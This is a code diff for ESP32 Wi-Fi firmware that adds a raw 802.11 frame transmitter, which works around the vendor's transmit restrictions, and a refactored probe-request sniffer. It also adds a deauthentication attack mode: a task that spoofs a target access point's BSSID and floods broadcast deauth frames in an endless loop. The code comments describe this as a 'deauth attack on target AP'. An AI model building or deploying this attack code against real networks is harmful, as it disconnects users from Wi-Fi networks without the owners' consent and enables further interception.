@@ -4,13 +4,14 @@
 #include "esp_log.h"
 #include "esp_event.h"
 
+#include "dissect.h"
+
 #define TAG "wifi_ctrl"
 #define DEFAULT_SCAN_LIST_SIZE 10
 
 ESP_EVENT_DEFINE_BASE(WIFI_CTRL_EVENT);
 
 wifi_controller_t g_wifi_ctrl;
-
 
 typedef struct {
 	unsigned frame_ctrl:16;
@@ -23,11 +24,96 @@ typedef struct {
 } wifi_ieee80211_mac_hdr_t;
 
 typedef struct {
+
+} wifi_ieee80211_probe_resp_t;
+
+typedef struct {
 	wifi_ieee80211_mac_hdr_t hdr;
 	uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
 } wifi_ieee80211_packet_t;
 
 void wifi_scanner_task(void *parameter);
+
+
+/***************************************************
+ * 802.11 raw packet send feature
+ **************************************************/
+typedef struct {
+  uint32_t flags;
+  uint32_t f_04;
+  uint32_t f_08;
+  uint32_t f_0C;
+  uint32_t f_10;
+} s2;
+
+typedef struct {
+  uint32_t f_00;
+  uint32_t f_04;
+  uint32_t f_08;
+  uint32_t f_0C;
+  uint32_t f_10;
+  uint16_t f_14;
+  uint16_t payload_size;
+  uint32_t f_18;
+  uint32_t f_1C;
+  uint32_t f_20;
+  uint32_t f_24;
+  uint32_t f_28;
+  s2 *f_2C;
+} s1;
+
+
+esp_err_t esp_wifi_80211_tx_(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq)
+{
+  void *p_alloc;
+  uint16_t *p0;
+  uint32_t value;
+  s1 *p_mac_frame;
+
+  /* Lock. */
+  (g_osi_funcs_p[21])(g_wifi_global_lock);
+
+  /* Allocate memory. */
+  p_mac_frame = (s1 *)ic_ebuf_alloc((void *)buffer,1,(void *)len);
+  if (p_mac_frame != NULL)
+  {
+    /* Fill in MAC structure. */
+    value = p_mac_frame->f_2C->flags;
+    p_mac_frame->f_14 = 0x18;
+    p_mac_frame->payload_size = len - 0x18;
+    __asm__ __volatile__ (
+      "memw"
+    );
+    p_mac_frame->f_2C->flags = value | 0x4000;
+    if (en_sys_seq)
+    {
+      p_mac_frame->f_2C->flags |= 1;
+    }
+    
+    p_mac_frame->f_2C->f_10 = (p_mac_frame->f_2C->f_10 & 0xfff7ffff) | ((ifx & 1) << 0x13);
+    
+    __asm__ __volatile__ (
+      "memw"
+    );
+
+    ieee80211_post_hmac_tx((void *)p_mac_frame);
+    
+    /* Unlock. */
+    (g_osi_funcs_p[22])(g_wifi_global_lock);
+  }
+  else
+  {
+    printf("Cannot allocate memory\r\n");
+
+    /* Unlock. */
+    (g_osi_funcs_p[22])(g_wifi_global_lock);
+  }
+
+  return 0;
+}
+
+
+
 
 /******************************************************************
  *                        WIFI DRIVER INTERFACE
@@ -88,76 +174,49 @@ wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type)
 
 void wifi_sniffer_packet_cb(void* buff, wifi_promiscuous_pkt_type_t type)
 {
+  wifi_pkt_subtype_t psubtype;
+  wifi_probe_req_t probe_req;
+  wifi_probe_rsp_t probe_rsp;
+
   uint8_t pkt_type, pkt_subtype;
   uint8_t dest[6], source[6], bssid[6];
   char essid[32];
   uint8_t *p_essid_tlv;
   int essid_size;
 
-  if (type != WIFI_PKT_MGMT)
-    return;
-
   const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
   const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;
   const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
 
   /* Display information only about probe request. */
-
-  /* If this packet a probe request ? */
-  pkt_type = (hdr->frame_ctrl >> 2) & 0x03;
-  pkt_subtype = (hdr->frame_ctrl >> 4) & 0x0F;
-  printf("[sniffer] Type: %02x Subtype: %02x\r\n", pkt_type, pkt_subtype);
-
-  //printf("[sniffer] pkt type: %02x | pkt subtype: %02x\r\n", pkt_type, pkt_subtype);
-  if ((pkt_type == 0) && ((pkt_subtype == 0x04) || (pkt_subtype == 0x05)))
+  if (wifi_pkt_get_type(ppkt->payload, &psubtype) == ESP_OK)
   {
-    switch(pkt_subtype)
+    switch(psubtype)
     {
-      case 0x04:
-        /* Copy dest, source, and bssid MACs */
-        memcpy(dest, &hdr->addr1, 6);
-        memcpy(source, &hdr->addr2, 6);
-        memcpy(bssid, &hdr->addr3, 6);
-
-        /* Parse ESSID. */
-        p_essid_tlv = (uint8_t *)&hdr->addr4;
-        if (p_essid_tlv[0] == 0)
+      case PKT_PROBE_REQ:
         {
-          essid_size = p_essid_tlv[1];
-          memcpy(essid, &p_essid_tlv[2], essid_size);
-          essid[essid_size] = '\0';
+          if (wifi_pkt_parse_probe_req(ppkt->payload, (wifi_probe_req_t *)&probe_req) == ESP_OK)
+          {
+            printf("[PROBE_REQ] ESSID: %s\r\n", probe_req.essid);
+          }
         }
-        else
-        {
-          essid[0] = '\0';
-        }
-
-        printf("[PROBE_REQ]-----------------------------\r\n");
-        printf(" DEST: %02x:%02x:%02x:%02x:%02x:%02x\r\n", dest[0], dest[1],dest[2],dest[3],dest[4],dest[5]);
-        printf("  SRC: %02x:%02x:%02x:%02x:%02x:%02x\r\n", source[0], source[1],source[2],source[3],source[4],source[5]);
-        printf("BSSID: %02x:%02x:%02x:%02x:%02x:%02x\r\n", bssid[0], bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
-        printf("ESSID: %s\r\n", essid);
-        printf("----------------------------------------\r\n");
         break;
 
-      case 0x05:
-        /* Copy dest, source, and bssid MACs */
-        memcpy(dest, &hdr->addr1, 6);
-        memcpy(source, &hdr->addr2, 6);
-        memcpy(bssid, &hdr->addr3, 6);
-        printf("[PROBE_RSP]-----------------------------\r\n");
-        printf(" DEST: %02x:%02x:%02x:%02x:%02x:%02x\r\n", dest[0], dest[1],dest[2],dest[3],dest[4],dest[5]);
-        printf("  SRC: %02x:%02x:%02x:%02x:%02x:%02x\r\n", source[0], source[1],source[2],source[3],source[4],source[5]);
-        printf("BSSID: %02x:%02x:%02x:%02x:%02x:%02x\r\n", bssid[0], bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
-        printf("----------------------------------------\r\n");
+      case PKT_PROBE_RSP:
+        {
+          if (wifi_pkt_parse_probe_rsp(ppkt->payload, (wifi_probe_rsp_t *)&probe_rsp) == ESP_OK)
+          {
+            printf("[PROBE_RSP] ESSID: %s\r\n", probe_rsp.essid);
+          }
+        }
         break;
 
       default:
         break;
+
     }
+
   }
-
-
 }
 
 
@@ -189,12 +248,106 @@ void wifi_sniffer_disable(void)
 
 void wifi_sniffer_enable(void)
 {
+  char test[]="thisisatest";
   ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_NULL) );
   ESP_ERROR_CHECK( esp_wifi_start() );
-  //esp_wifi_set_channel(11, 0);
+  esp_wifi_set_channel(6, 0);
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_packet_cb);
 }
+
+/******************************************************************
+ *                             WIFI DEAUTH
+ *****************************************************************/
+#define BEACON_SSID_OFFSET 38
+#define SRCADDR_OFFSET 10
+#define BSSID_OFFSET 16
+#define SEQNUM_OFFSET 22
+
+/**
+ * wifi_deauth_task()
+ * 
+ * @brief: Background task that handles deauth.
+ **/
+
+void wifi_deauth_task(void *parameter)
+{
+  int i;
+  uint16_t seqnum = 0;
+  uint8_t deauth_packet[26] = {0};
+
+  /* Set frame control + duration. */
+  deauth_packet[0] = 0xC0;  /* Deauth */
+  deauth_packet[1] = 0x00;
+  deauth_packet[2] = 0x00;
+  deauth_packet[3] = 0x00;
+
+  /* Set destination mac, source mac and bssid. */
+  for (i=0; i<6; i++)
+  {
+    deauth_packet[4 + i] = 0xFF;
+    deauth_packet[10 + i] = g_wifi_ctrl.deauth_target[i];
+    deauth_packet[16 + i] = g_wifi_ctrl.deauth_target[i];
+  }
+  
+  /* Set reason code (3). */
+  deauth_packet[24] = 3;
+  deauth_packet[25] = 0;
+ 
+  /* Loop and send packet. */
+  while (1)
+  {
+		deauth_packet[22] = (seqnum & 0x0f) << 4;
+		deauth_packet[23] = (seqnum & 0xff0) >> 4;
+		seqnum++;
+		if (seqnum > 0xfff)
+			seqnum = 0;
+
+    /* Send packet */
+    esp_wifi_80211_tx_(WIFI_IF_STA, deauth_packet, 26, false);
+
+    /* Send packet. */
+    vTaskDelay(1);
+  }
+}
+
+
+/**
+ * wifi_deauth_disable()
+ * 
+ * @brief: disable deauth mode.
+ **/
+
+void wifi_deauth_disable(void)
+{
+  /* Stop our scanner task. */
+  vTaskDelete(g_wifi_ctrl.current_task_handle);
+
+  /* Stop WiFi. */
+  if (g_wifi_ctrl.b_enabled)
+  {
+    wifi_disable();
+    g_wifi_ctrl.b_enabled = false;
+  }
+}
+
+
+/**
+ * wifi_deauth_enable()
+ * 
+ * @brief: enable deauth mode.
+ **/
+
+void wifi_deauth_enable(void)
+{
+  ESP_ERROR_CHECK( esp_wifi_set_mode(WIFI_MODE_STA) );
+  ESP_ERROR_CHECK( esp_wifi_start() );
+  esp_wifi_set_channel(g_wifi_ctrl.deauth_channel, 0);
+
+  /* Start scanner. */
+  xTaskCreate(wifi_deauth_task, "wifi_deauth", 10000, NULL, 1, &g_wifi_ctrl.current_task_handle);
+}
+
 
 
 /******************************************************************
@@ -261,7 +414,6 @@ static void wifi_scanner_event_handler(void* arg, esp_event_base_t event_base, i
     ESP_LOGI(TAG, "wifi scan done");
     g_wifi_ctrl.scan_state = SCANNER_IDLE;
   }
-
 }
 
 /**
@@ -436,6 +588,11 @@ void wifi_set_mode(wifi_controller_mode_t mode)
       ESP_LOGD(TAG, "disabling sniffer ...");
       wifi_sniffer_disable();
       break;
+
+    case WIFI_DEAUTH:
+      ESP_LOGD(TAG, "disabling deauther ...");
+      wifi_deauth_disable();
+      break;
     
     default:
       break;
@@ -454,6 +611,11 @@ void wifi_set_mode(wifi_controller_mode_t mode)
       wifi_sniffer_enable();
       break;
 
+    case WIFI_DEAUTH:
+      ESP_LOGD(TAG, "enabling deauther ...");
+      wifi_deauth_enable();
+      break;
+
     default:
       break;
   }
@@ -461,4 +623,26 @@ void wifi_set_mode(wifi_controller_mode_t mode)
   ESP_LOGD(TAG, "current mode is now %d", mode);
   g_wifi_ctrl.mode = mode;
 
+}
+
+
+/**************************************
+ * Helpers
+ *************************************/
+
+/**
+ * wifi_deauth_target()
+ * 
+ * @brief: start deauth attack on target AP.
+ * @param p_bssid: target BSSID.
+ **/
+
+void wifi_deauth_target(uint8_t *p_bssid, int channel)
+{
+  /* Copy target MAC(BSSID) into memory. */
+  memcpy(&g_wifi_ctrl.deauth_target, p_bssid, 6);
+  g_wifi_ctrl.deauth_channel = channel;
+
+  /* Start deauth ! */
+  wifi_set_mode(WIFI_DEAUTH);
 }
